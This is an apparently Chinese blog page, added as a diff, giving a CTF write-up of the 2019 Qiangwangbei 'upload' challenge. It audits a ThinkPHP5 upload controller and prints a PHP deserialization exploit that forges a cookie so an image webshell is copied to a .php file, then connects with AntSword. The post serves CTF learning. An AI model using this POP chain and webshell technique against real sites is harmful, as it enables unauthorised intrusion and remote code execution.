@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html  lang="zh-cn" >
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#fff" id="theme-color">
+  <meta name="description" content="Husins">
+  <link rel="icon" href="/img/dog.jpg">
+  <title>2019强网杯upload</title>
+  
+  
+  <meta property="og:title" content="2019强网杯upload">
+  
+  
+  <meta property="og:url" content="https://husins.cn/2019%E5%BC%BA%E7%BD%91%E6%9D%AFupload/index.html">
+  
+  
+  <meta property="og:img" content="/img/dog.png">
+  
+  
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:published_time" content="2021-05-28">
+  <meta property="og:article:modified_time" content="2021-05-28">
+  <meta property="og:article:author" content="Husins">
+  
+  
+  <meta property="og:article:tag" content="反序列化">
+  
+  
+  
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+    var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+      }
+    };
+    setDarkmode();
+  </script>
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+  </script>
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+  <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+
+  
+  
+<link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div class="wrapper">
+    
+    <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+      <img class="navbar-logo-img" src="/img/dog.jpg" alt="logo">
+      
+      <span class="navbar-logo-dsc">Husins Blogs</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+    <a href="/" class="navbar-menu-item">
+    
+    主页
+    
+    </a>
+    
+    <a href="/categories" class="navbar-menu-item">
+    
+    分类
+    
+    </a>
+    
+    <a href="/tags" class="navbar-menu-item">
+    
+    标签
+    
+    </a>
+    
+    <a href="/about" class="navbar-menu-item">
+    
+    关于我
+    
+    </a>
+    
+    <a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i></a>
+    <a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size: 1.2rem; font-weight: 400;"></i></a>
+  </div>
+</nav>
+    
+    <div id="local-search" style="display: none;">
+      <input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容...">
+      <div id="search-content"></div>
+    </div>
+    
+    <div class="section-wrap">
+      <div class="container">
+        <div class="columns">
+          <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      2019强网杯upload
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-05-28T13:30:03.000Z">
+      <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
+      <span>2021-05-28</span>
+    </time>
+    
+    <span class="dot"></span>
+    
+    <a href="/categories/CTF题解/" class="post-meta-link">CTF题解</a>
+    
+    
+    
+    <span class="dot"></span>
+    <span>1.3k words</span>
+    
+  </div>
+  
+  <div class="post-meta post-show-meta" style="margin-top: -10px;">
+    <div style="display: flex; align-items: center;">
+      <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
+      
+      
+        <a href="/tags/反序列化/" class="post-meta-link">反序列化</a>
+      
+    </div>
+  </div>
+  
+  </header>
+  <div id="section" class="post-content">
+    <p>进入题目登陆注册，先注册一个账户试试：test/husins@qq.com/123456</p>
+<p>成功登陆，上传一个正常图片试试。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210522214404155.png" alt="image-20210522214404155" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210522214404155.png" class="lozad post-image"></p>
+<p>图片正常上传，能够获得图片的路径，而且图片被重命名。</p>
+<p>尝试注册其他用户，发现过滤的很严苛，只能上传图片，很多绕过方法都不可以。</p>
+<p>访问<code>upload</code>目录</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210522214754470.png" alt="image-20210522214754470" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210522214754470.png" class="lozad post-image"></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210522214730843.png" alt="image-20210522214730843" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210522214730843.png" class="lozad post-image"></p>
+<p>不愧是强网杯，真的厉害，文件上传都能这么难，这里就没有别的思路了。尝试找找其他的信息吧！</p>
+<p>进行目录扫描</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528192548134.png" alt="image-20210528192548134" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528192548134.png" class="lozad post-image"></p>
+<p>找到备份文件一份，看看备份文件里面都有什么吧。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528192847372.png" alt="image-20210528192847372" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528192847372.png" class="lozad post-image"></p>
+<p>这个站是基于<code>thinkphp5</code>开发的，进行代码审计，给了一大堆源码，从文件上传部分开始审计，看看它后续对我们的文件做了怎样的处理。</p>
+<p>文件路径：<code>application\web\controller\Profile.php</code>(对框架不熟悉，这个文件找了好久，我是真的菜，哭了)</p>
+<pre class="highlight"><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $checker;<br>    <span class="hljs-keyword">public</span> $filename_tmp;<br>    <span class="hljs-keyword">public</span> $filename;<br>    <span class="hljs-keyword">public</span> $upload_menu;<br>    <span class="hljs-keyword">public</span> $ext;<br>    <span class="hljs-keyword">public</span> $img;<br>    <span class="hljs-keyword">public</span> $except;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker=<span class="hljs-keyword">new</span> Index();<br>        <span class="hljs-keyword">$this</span>-&gt;upload_menu=md5($_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        @chdir(<span class="hljs-string">&quot;../public/upload&quot;</span>);<br>        <span class="hljs-keyword">if</span>(!is_dir(<span class="hljs-keyword">$this</span>-&gt;upload_menu))&#123;<br>            @mkdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);<br>        &#125;<br>        @chdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;checker)&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;checker-&gt;login_check())&#123;<br>                $curr_url=<span class="hljs-string">&quot;http://&quot;</span>.$_SERVER[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="hljs-string">&quot;/index&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;redirect($curr_url,<span class="hljs-number">302</span>);<br>                <span class="hljs-keyword">exit</span>();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;filename=md5($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;ext_check();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext) &#123;<br>            <span class="hljs-keyword">if</span>(getimagesize(<span class="hljs-keyword">$this</span>-&gt;filename_tmp)) &#123;<br>                @copy(<span class="hljs-keyword">$this</span>-&gt;filename_tmp, <span class="hljs-keyword">$this</span>-&gt;filename);<br>                @unlink(<span class="hljs-keyword">$this</span>-&gt;filename_tmp);<br>                <span class="hljs-keyword">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-subst">$this</span>-&gt;upload_menu/<span class="hljs-subst">$this</span>-&gt;filename&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;update_img();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        $user_info=db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;ID&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>])-&gt;find();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($user_info[<span class="hljs-string">&#x27;img&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;img)&#123;<br>            <span class="hljs-keyword">if</span>(db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&#x27;ID&#x27;</span>,$user_info[<span class="hljs-string">&#x27;ID&#x27;</span>])-&gt;data([<span class="hljs-string">&quot;img&quot;</span>=&gt;addslashes(<span class="hljs-keyword">$this</span>-&gt;img)])-&gt;update())&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;update_cookie();<br>                <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;Upload img successful!&#x27;</span>, url(<span class="hljs-string">&#x27;../home&#x27;</span>));<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Upload file failed!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_cookie</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&#x27;img&#x27;</span>]=<span class="hljs-keyword">$this</span>-&gt;img;<br>        cookie(<span class="hljs-string">&quot;user&quot;</span>,base64_encode(serialize(<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile)),<span class="hljs-number">3600</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ext_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        $ext_arr=explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">$this</span>-&gt;ext=end($ext_arr);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext==<span class="hljs-string">&quot;png&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$name</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;except[$name];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$name, $arguments</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;&#123;$name&#125;)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre>
+
+<p>梳理一下代码逻辑</p>
+<ul>
+<li>继承整个 Controller</li>
+<li>实例化Index这个类，进行用户登陆校验</li>
+<li>将上传图片的文件名进行<code>mad5</code>加密之后修改文件后缀为<code>.png</code></li>
+<li>将修改之后的图片保存在<code>upload</code>目录 下</li>
+<li>对cookie的值进行序列化并<code>base64</code>编码 </li>
+<li>使用ext_check（）校验文件后缀名是否为<code>.png</code></li>
+<li>还有两个不常见的魔术方法<ul>
+<li>当对象调用不可访问属性时，就会自动触发get魔法方法</li>
+<li>在对象调用不可访问函数时，就会自动触发call魔法方法。</li>
+</ul>
+</li>
+</ul>
+<p>看到这明显是反序列化+文件上传的组合题，核心部分是绕过对后缀名的检查。</p>
+<p>后缀名的检测明显</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528204325971.png" alt="image-20210528204325971" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528204325971.png" class="lozad post-image"></p>
+<p>让这里返回1就可以了，也就是 我们第一次直接上传一个<code>.png</code>类型的文件即可绕过。</p>
+<ul>
+<li><p>触发call魔法方法</p>
+<ul>
+<li><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528205259156.png" alt="image-20210528205259156" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528205259156.png" class="lozad post-image"></p>
+</li>
+<li><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528205018228.png" alt="image-20210528205018228" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528205018228.png" class="lozad post-image"></p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><code>Register.php</code>文件中存在析构函数，且存在两个可控变量，我们令checker这个属性为Profile类，然后就会调用Profile类里的index()函数，那么就会触发__call魔术方法</p>
+</li>
+<li><p>触发get魔法方法</p>
+<ul>
+<li>当触发<code>__call</code>之后，name是不可访问函数的名字,arguments是参数，为空,而当使用this-&gt;index,就是访问一个不可访问的属性，然后触发__get()魔术方法</li>
+</ul>
+</li>
+</ul>
+<p>这里还用提到需要调用的函数：<code>updata_img</code></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528210306044.png" alt="image-20210528210306044" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528210306044.png" class="lozad post-image"></p>
+<p>他在<code>upload_img</code>被调用</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528210530998.png" alt="image-20210528210530998" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210528210530998.png" class="lozad post-image"></p>
+<p>第三个<code>if</code> 我们让ext等于1即可进入,filename我们可控，由此可以通过这个来将我们的webshell复制到filename里去,要触发这个东西我们需要调用,upload_img这个方法,而调用upload_img刚好可以通过上面那两个魔术方法调用</p>
+<p><strong>最终思路：</strong></p>
+<ul>
+<li>让A类访问一个不可访问的函数，触发__call</li>
+<li>在通过call里访问不可访问的属性触发__get</li>
+<li>=通过<code>__get</code>调用<code>upload_Img</code>方法</li>
+</ul>
+<p>构造EXP：</p>
+<pre class="highlight"><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $checker;<br>    <span class="hljs-keyword">public</span> $registed =<span class="hljs-number">0</span>;<span class="hljs-comment">//目的是过destruct里的if;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $checker =<span class="hljs-number">0</span> ;<span class="hljs-comment">//目的是绕过index类的检查，防止退出程序</span><br>    <span class="hljs-keyword">public</span> $filename_tmp=<span class="hljs-string">&quot;./upload/*****.png&quot;</span>;<br>    <span class="hljs-keyword">public</span> $upload_menu;<br>    <span class="hljs-keyword">public</span> $filename=<span class="hljs-string">&quot;upload/123.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> $ext=<span class="hljs-number">1</span>;<span class="hljs-comment">//目的是过if来调用复制webshell</span><br>    <span class="hljs-keyword">public</span> $img;<br>    <span class="hljs-keyword">public</span> $except=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;index&quot;</span>=&gt;<span class="hljs-string">&quot;upload_img&quot;</span>);<span class="hljs-comment">//目的是通过__get()魔术方法调用upload_Img函数</span><br>&#125;<br><br>$a = <span class="hljs-keyword">new</span> Register();<br>$a-&gt;checker = <span class="hljs-keyword">new</span> Profile();<span class="hljs-comment">//目的是调用POP链</span><br>$a-&gt;checker-&gt;checker=<span class="hljs-number">0</span>；<span class="hljs-comment">//调用pop链防止退出程序</span><br><br><span class="hljs-keyword">echo</span> base64_encode(serialize($a));<br></code></pre>
+
+<p>攻击流程：</p>
+<ul>
+<li>上传图片马</li>
+<li>使用exp生成cookie，并且替换cookie</li>
+<li>访问文件，连接蚁剑</li>
+</ul>
+
+  </div>
+  <div>
+  
+  <div class="post-note note-warning copyright" style="margin-top: 42px">
+    <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/about">Husins</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/2019%E5%BC%BA%E7%BD%91%E6%9D%AFupload/">https://husins.cn/2019%E5%BC%BA%E7%BD%91%E6%9D%AFupload/</a></p>
+    <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+  </div>
+  
+  </div>
+</article>
+<div class="nav">
+  
+  
+  <div class="nav-item-next">
+    <a href="/CISCN2019总决赛Day2-Web1Easyweb/" class="nav-link">
+      <div>
+        <div class="nav-label">Next</div>
+        
+        <div class="nav-title">CISCN2019总决赛Day2-Web1Easyweb </div>
+        
+      </div>
+      <i class="iconfont icon-right nav-next-icon"></i>
+    </a>
+  </div>
+  
+</div>
+
+<div class="card card-content toc-card" id="mobiletoc">
+  <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
+
+</div></main>
+          <aside class="left-column">
+            
+            <div class="card card-author">
+              
+<img src="/img/dog.png" class="author-img">
+
+<p class="author-name">Husins</p>
+<p class="author-description">层楼终究误少年,自由早晚乱余生。</p>
+<div class="author-message">
+  <a class="author-posts-count" href="/archives">
+    <span>63</span>
+    <span>Posts</span>
+  </a>
+  <a class="author-categories-count" href="/categories">
+    <span>6</span>
+    <span>Categories</span>
+  </a>
+  <a class="author-tags-count" href="/tags">
+    <span>20</span>
+    <span>Tags</span>
+  </a>
+</div>
+
+            </div>
+            
+            <div class="sticky-tablet">
+  
+  
+  <article class="display-when-two-columns spacer">
+    <div class="card card-content toc-card">
+      <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
+
+    </div>
+  </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right: 2px;"></i>Categories</div>
+  <div class="categories-list">
+    
+      <a href="/categories/CTF题解">
+        <div class="categories-list-item">
+          CTF题解
+          <span class="categories-list-item-badge">46</span>
+        </div>
+      </a>
+    
+      <a href="/categories/漏洞总结">
+        <div class="categories-list-item">
+          漏洞总结
+          <span class="categories-list-item-badge">11</span>
+        </div>
+      </a>
+    
+      <a href="/categories/工具使用">
+        <div class="categories-list-item">
+          工具使用
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/MISC">
+        <div class="categories-list-item">
+          MISC
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/漏洞复现">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right: 2px;"></i>hot tags</div>
+  <div class="tags-list">
+    
+    <a href="\tags\BUUCTF" title="BUUCTF"><div class="tags-list-item">BUUCTF</div></a>
+    
+    <a href="\tags\RCE" title="RCE"><div class="tags-list-item">RCE</div></a>
+    
+    <a href="\tags\SQL" title="SQL"><div class="tags-list-item">SQL</div></a>
+    
+    <a href="\tags\攻防世界" title="攻防世界"><div class="tags-list-item">攻防世界</div></a>
+    
+    <a href="\tags\python" title="python"><div class="tags-list-item">python</div></a>
+    
+    <a href="\tags\反序列化" title="反序列化"><div class="tags-list-item">反序列化</div></a>
+    
+    <a href="\tags\SSTI" title="SSTI"><div class="tags-list-item">SSTI</div></a>
+    
+    <a href="\tags\SQL,文件上传" title="SQL,文件上传"><div class="tags-list-item">SQL,文件上传</div></a>
+    
+    <a href="\tags\flask" title="flask"><div class="tags-list-item">flask</div></a>
+    
+    <a href="\tags\文件上传" title="文件上传"><div class="tags-list-item">文件上传</div></a>
+    
+    <a href="\tags\nmap" title="nmap"><div class="tags-list-item">nmap</div></a>
+    
+    <a href="\tags\CVE-2018-16385" title="CVE-2018-16385"><div class="tags-list-item">CVE-2018-16385</div></a>
+    
+    <a href="\tags\JWT Pickle" title="JWT Pickle"><div class="tags-list-item">JWT Pickle</div></a>
+    
+    <a href="\tags\XXE" title="XXE"><div class="tags-list-item">XXE</div></a>
+    
+    <a href="\tags\ms17-010" title="ms17-010"><div class="tags-list-item">ms17-010</div></a>
+    
+    <a href="\tags\信息收集" title="信息收集"><div class="tags-list-item">信息收集</div></a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+          <aside class="right-column">
+            <div class="sticky-widescreen">
+  
+  
+  <article class="card card-content toc-card">
+    <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
+
+  </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right: 2px;"></i>Recent Posts</div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-05-28</div>
+        <a href="/2019强网杯upload/"><div class="recent-posts-item-content">2019强网杯upload</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-05-19</div>
+        <a href="/CISCN2019总决赛Day2-Web1Easyweb/"><div class="recent-posts-item-content">CISCN2019总决赛Day2-Web1Easyweb</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-05-18</div>
+        <a href="/SUCTF-2019-Pythonginx/"><div class="recent-posts-item-content">SUCTF 2019-Pythonginx</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-05-18</div>
+        <a href="/GYCTF2020-FlaskApp/"><div class="recent-posts-item-content">GYCTF2020-FlaskApp</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>Copyright ©
+          
+          2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a href="/" class="footer-link">Husins Blogs </a>
+      </div>
+    </div>
+
+    
+    <div class="footer-dsc">
+      
+      Powered by
+      <a href="https://hexo.io/" class="footer-link" target="_blank" rel="nofollow noopener noreferrer">&nbsp;Hexo </a>
+      
+      
+      <span>&nbsp;|&nbsp;</span>
+      
+      
+      Theme -
+      <a href="https://github.com/theme-kaze" class="footer-link" target="_blank"
+        rel="nofollow noopener noreferrer">&nbsp;Kaze</a>
+      
+    </div>
+    
+    
+    
+    
+      <div class="footer-dsc">
+        
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+        <span>&nbsp;|&nbsp;</span>
+        
+        
+        本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer>
+  <a role="button" id="scrollbutton" class="basebutton"  aria-label="回到顶部">
+  <i class="iconfont icon-arrowleft button-icon"></i>
+</a>
+<a role="button" id="menubutton" class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a role="button" id="popbutton" class="basebutton" aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a role="button" id="darkbutton" class="basebutton darkwidget" aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a role="button" id="searchbutton" class="basebutton searchwidget" aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a>
+
+  
+  
+  
+  <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img');
+    var i;
+    for (i = 0; i < img.length; i++) {
